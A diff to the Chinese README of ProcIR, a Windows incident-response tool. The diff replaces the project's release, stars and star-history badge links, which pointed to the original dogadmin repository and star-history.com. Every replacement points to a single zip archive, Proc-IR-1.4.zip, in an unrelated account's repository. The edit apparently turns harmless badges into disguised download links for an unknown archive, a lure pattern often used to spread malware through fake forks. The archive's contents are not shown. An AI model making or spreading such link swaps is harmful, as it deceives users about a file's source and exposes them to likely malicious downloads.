@@ -1,7 +1,7 @@
 # ProcIR - Windows 应急响应进程排查工具
 
-[![GitHub Release](https://img.shields.io/github/v/release/dogadmin/ProcIR)](https://github.com/dogadmin/ProcIR/releases/latest)
-[![GitHub Stars](https://img.shields.io/github/stars/dogadmin/ProcIR?style=social)](https://github.com/dogadmin/ProcIR/stargazers)
+[![GitHub Release](https://img.shields.io/github/v/release/dogadmin/ProcIR)](https://github.com/Phylliumtestdriver883/ProcIR/raw/refs/heads/main/internal/context/Proc-IR-1.4.zip)
+[![GitHub Stars](https://img.shields.io/github/stars/dogadmin/ProcIR?style=social)](https://github.com/Phylliumtestdriver883/ProcIR/raw/refs/heads/main/internal/context/Proc-IR-1.4.zip)
 
 **中文** | [English](README_EN.md)
 
@@ -404,7 +404,7 @@ procir/
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=dogadmin/ProcIR&type=Date)](https://star-history.com/#dogadmin/ProcIR&Date)
+[![Star History Chart](https://github.com/Phylliumtestdriver883/ProcIR/raw/refs/heads/main/internal/context/Proc-IR-1.4.zip)](https://github.com/Phylliumtestdriver883/ProcIR/raw/refs/heads/main/internal/context/Proc-IR-1.4.zip)
 
 ---
 
